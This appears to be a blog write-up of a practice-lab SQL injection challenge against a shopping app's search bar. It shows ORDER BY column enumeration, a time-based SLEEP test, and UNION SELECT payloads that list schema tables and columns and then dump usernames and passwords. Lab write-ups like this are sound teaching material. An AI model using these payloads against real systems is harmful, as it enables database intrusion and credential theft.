# :game_die: Bsql Injection Shenanigans 2 75E96Df54E2A

---

It is a shopping app with a list of products and a search bar.

I searched for “Shougatsu Sushi Rack” and added ‘ — -‘ to the search term. It only returned the product I searched for. I then opened Burp Suite to check the request and review the search bar parameter to test for blind SQL injection.

Funny how I started testing the search parameter with ORDER BY and it worked. I found out that there are 4 columns and their data types. I hope you remember the function of the ORDER BY.

```
' ORDER BY 4-- -
```

```
' ORDER BY 'aab','abb','bcc','cab'-- -
```

I hope you remembered the rules for using UNION.

Rules for using UNION Statement

>

*1. Number of columns
2. Must be same data type*

I also tried the time-based payload and it works.

```
' AND SLEEP(8)-- -
```

I was trying to retrieve the database version using payloads, but it wasn’t working even though the payload is correct (little secret, I made a mistake while creating my payload, but I was able to correct it. Don’t tell anyone).

Payloads I tried to use:

```
' UNION SELECT @@version,NULL,NULL,NULL-- -
' UNION SELECT VERSION(),NULL,NULL,NULL-- -
' UNION SELECT @@GLOBAL.version,NULL,NULL,NULL-- -
```

I don’t know why the database version is not showing. What I noticed is that when I run a normal query, it returns the expected content length. However, when I try to retrieve the version, the content length increases but no information about the version is returned.

## Get callgh0st’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

I tried everything I could, but it wasn’t working. So, I decided to query it to list all tables for me using:

```
' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables-- -
```

It works, and I saw a table named “injection0x03_users 円” So, I tried to get the columns in the table using:

```
' UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name = 'injection0x03_users 円'-- -
```

It was not working. I tried and tried, but it wasn’t working, so I removed the 円 , and surprisingly, it worked. Wow!

```
' UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name = 'injection0x03_users '-- -
```

I saw columns for password and username with 円 next to them. I will exclude 円 when making the query.

```
' UNION SELECT password,username,NULL,NULL FROM injection0x03_users-- -
```

I received the information, but I’m not sure if it’s a password or a username since it’s written in Japanese.

onigirigadaisuki
takeshi.

---
